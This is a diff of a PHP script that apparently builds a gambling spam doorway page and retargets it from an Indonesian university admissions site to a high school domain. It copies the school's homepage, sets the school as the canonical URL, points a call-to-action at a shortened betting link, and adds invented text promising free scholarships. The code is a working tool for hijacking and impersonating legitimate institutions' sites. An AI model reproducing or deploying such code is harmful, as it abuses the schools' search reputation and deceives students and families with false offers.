@@ -1,7 +1,7 @@
 <?php
 function feedback404()
 {
-  echo file_get_contents("https://feb.unisba.ac.id/");
+  echo file_get_contents("https://sman1sanamanmantikei.sch.id/");
 
 }
 
@@ -32,15 +32,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://tamuramah.store/id/$dashbrand";
-$canonical = "https://pmb.stkiprosaliametro.ac.id/pmb/$dashbrand";
+$amphtml = "https://tamuramah.com/id/$dashbrand";
+$canonical = "https://sman1sanamanmantikei.sch.id/$dashbrand";
 $cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1730815425/OIG1.kgN5dmhp2XE1IxNzPSUd_mdu9lk.jpg";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1731503467/OIG4.PR_b3W0fFZWm5_Z7MLd0_dv9jhs.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Pendaftaran Mahasiswa STKIP Rosalia";
-$desc = "$namabrand memberikan ruang untuk pendaftaran mahasiswa baru dengan kuota yang terbatas karena banyaknya pendaftar dari berbagai sekolah SMA maupun SMK dengan persaingan yang cukup kuat serta terbatasnya jumlah kelas.";
-$konten = "$namabrand memberikan ruang untuk pendaftaran mahasiswa baru dengan kuota yang terbatas karena banyaknya pendaftar dari berbagai sekolah SMA maupun SMK dengan persaingan yang cukup kuat serta terbatasnya jumlah kelas.";
+$judul = "$namabrand Silabus SMAN 1 Sanaman Mantikei";
+$desc = "$namabrand memberikan program beasiswa untuk semua siswa yang berprestasi di SMA Negeri 1 Sanaman Mantikei secara gratis, agar pelajar yang memiiliki keunggulan baik secara akademik bisa bersaing dengan sekolah lainnya.";
+$konten = "$namabrand memberikan program beasiswa untuk semua siswa yang berprestasi di SMA Negeri 1 Sanaman Mantikei secara gratis, agar pelajar yang memiiliki keunggulan baik secara akademik bisa bersaing dengan sekolah lainnya.";
 ?>
 
 <!DOCTYPE HTML>
